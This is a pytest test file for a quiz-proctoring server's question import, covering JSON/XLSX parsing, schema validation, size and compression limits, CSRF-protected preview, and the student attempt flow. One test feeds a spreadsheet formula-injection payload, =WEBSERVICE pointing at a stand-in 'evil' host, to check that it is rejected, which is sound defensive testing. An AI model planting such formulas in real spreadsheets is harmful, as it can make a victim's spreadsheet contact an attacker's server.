from copy import deepcopy
from io import BytesIO
import json
from zipfile import ZipFile, ZIP_DEFLATED

import pytest

from proctoring_server.imports import XLSX_COLUMNS, parse_import


def workbook_bytes(rows):
    Workbook = pytest.importorskip("openpyxl", reason="Server XLSX dependency not installed").Workbook
    book = Workbook()
    sheet = book.active
    sheet.title = "Questions"
    sheet.append(XLSX_COLUMNS)
    for row in rows:
        sheet.append(row)
    stream = BytesIO()
    book.save(stream)
    book.close()
    return stream.getvalue()


def test_json_and_xlsx_normalize_same_schema(document):
    assert parse_import("sample.json", json.dumps(document).encode()) == document
    rows = [(q["id"], q["type"], q["prompt"], option["id"], option["text"], option["id"] in q["correct_option_ids"])
            for q in document["questions"] for option in q["options"]]
    parsed = parse_import("Arithmetic.xlsx", workbook_bytes(rows))
    assert parsed == document


@pytest.mark.parametrize("mutate", [
    lambda data: data["questions"][0].update(correct_option_ids=["missing"]),
    lambda data: data["questions"][0].update(type="essay"),
    lambda data: data["questions"][0].update(correct_option_ids=["two", "three"]),
    lambda data: data["questions"][0]["options"].append({"id": "two", "text": "duplicate"}),
    lambda data: data["questions"].append(deepcopy(data["questions"][0])),
])
def test_invalid_question_schema_rejected(document, mutate):
    mutate(document)
    with pytest.raises(ValueError):
        parse_import("quiz.json", json.dumps(document).encode())


def test_formula_and_bad_boolean_rejected():
    base = [("q", "single_choice", "Question?", "a", "A", True), ("q", "single_choice", "Question?", "b", "B", False)]
    for replacement in (("q", "single_choice", "=WEBSERVICE(\"https://evil\")", "a", "A", True),
                        ("q", "single_choice", "Question?", "a", "A", "yes")):
        with pytest.raises(ValueError):
            parse_import("quiz.xlsx", workbook_bytes([replacement, base[1]]))


def test_import_limits_and_extensions():
    for filename, data in (("quiz.xlsm", b"abc"), ("quiz.json", b""), ("quiz.json", b"a" * (2 * 1024 * 1024 + 1)),
                           ("quiz.xlsx", b"not a zip"), ("quiz.json", b'{"questions":[NaN]}')):
        with pytest.raises(ValueError):
            parse_import(filename, data)
    archive = BytesIO()
    with ZipFile(archive, "w", ZIP_DEFLATED) as output:
        output.writestr("xl/sharedStrings.xml", "0" * (2 * 1024 * 1024))
    with pytest.raises(ValueError, match="compression"):
        parse_import("quiz.xlsx", archive.getvalue())


def test_preview_requires_teacher_and_csrf(client, owner, document):
    contents = json.dumps(document).encode()
    assert client.post("/api/v1/libraries/preview", files={"file": ("quiz.json", contents)}).status_code == 403
    headers = {"Origin": "http://127.0.0.1:5174"}
    logged = client.post("/api/v1/auth/login", json={"email": "teacher@example.com", "password": "test password 12345"}, headers=headers).json()
    headers["X-CSRF-Token"] = logged["csrf_token"]
    response = client.post("/api/v1/libraries/preview", files={"file": ("quiz.json", contents)}, headers=headers)
    assert response.status_code == 200
    assert response.json() == document


def test_routes_student_roundtrip(client, admitted):
    credential = {"Authorization": "Bearer " + admitted["credential"]}
    assert client.get("/api/v1/student/attempt").status_code == 401
    response = client.get("/api/v1/student/attempt", headers=credential)
    assert response.status_code == 200
    assert "credential" not in response.json()
    assert client.post("/api/v1/student/start", headers=credential).json()["status"] == "started"
    assert client.post("/api/v1/student/finish", headers=credential, json={"score": 1, "total": 2, "end_reason": "submitted"}).json()["status"] == "finished"
